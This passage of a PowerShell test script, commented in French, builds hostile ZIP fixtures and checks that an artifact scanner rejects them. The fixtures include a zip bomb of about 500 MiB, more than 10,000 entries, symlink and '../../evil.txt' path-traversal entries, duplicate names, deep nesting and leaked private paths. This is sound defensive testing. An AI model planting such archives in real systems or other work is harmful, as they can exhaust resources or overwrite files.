  Expect 'M-06 artefact .zip illisible refusé' "$z\casse.zip" 'artifact-layout/unscannable-archive'
  New-HostileZip "$z\bombe.zip" @(@{ name = 'skill/zeros.bin'; zeros = 525336576 })
  Expect 'M-06 bombe ZIP (> 500 Mio décompressés) refusée' "$z\bombe.zip" 'artifact-layout/archive-too-large'
  $many = foreach ($i in 1..10001) { @{ name = "skill/f$i.txt"; text = 'x' } }
  New-HostileZip "$z\entrees.zip" $many
  Expect 'M-06 plus de 10 000 entrées refusées' "$z\entrees.zip" 'artifact-layout/archive-too-large'
  New-HostileZip "$z\dlp.zip" @(@{ name = 'skill/notes.md'; text = "Voir $userPath`n" })
  Expect 'M-06 chemin privé dans un artefact .zip' "$z\dlp.zip" 'artifact-dlp/dlp-private-path'

  # M-05 : un ZIP rangé dans un dossier reçoit les mêmes contrôles de structure qu'un artefact .zip
  $d = New-Case 'm05-lien'; New-HostileZip (Join-Path $d 'lot.zip') @(@{ name = 'a.txt'; text = "x`n" }, @{ name = 'lien'; text = '../../x'; attr = $linkAttr })
  Expect 'M-05 lien symbolique dans un ZIP d''un dossier' $d 'artifact-layout/linked-entry'
  $d = New-Case 'm05-doublon'; New-HostileZip (Join-Path $d 'lot.zip') @(@{ name = 'A.txt'; text = "x`n" }, @{ name = 'a.txt'; text = "y`n" })
  Expect 'M-05 doublon dans un ZIP d''un dossier' $d 'artifact-layout/duplicate-entry'
  $d = New-Case 'm05-traversal'; New-HostileZip (Join-Path $d 'sauvegarde.bak') @(@{ name = '../../evil.txt'; text = "x`n" })
  Expect 'M-05 traversée dans une archive renommée d''un dossier' $d 'artifact-layout/unsafe-entry'
  $d = New-Case 'm05-profondeur'; [IO.File]::WriteAllBytes((Join-Path $d 'lot.zip'), $lvl)
  Expect 'M-05 imbrication trop profonde dans un dossier' $d 'artifact-layout/archive-too-deep'
  $d = New-Case 'm05-bombe'; New-HostileZip (Join-Path $d 'lot.zip') @(@{ name = 'zeros.bin'; zeros = 525336576 })
  Expect 'M-05 bombe ZIP dans un dossier' $d 'artifact-layout/archive-too-large'

  $d = New-Case 'gros-texte'; $sb = New-Object Text.StringBuilder; [void]$sb.Append(('x' * 100 + "`n") * 105000); [IO.File]::WriteAllText((Join-Path $d 'journal.log'), $sb.ToString()); Expect 'CA-05 fichier texte > 10 Mo refusé' $d 'artifact-dlp/unscanned-text-file'
} finally {
  Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue
}
Write-Output "RÉSULTAT : $($count - $failures)/$count conformes"
if ($failures) { exit 1 }
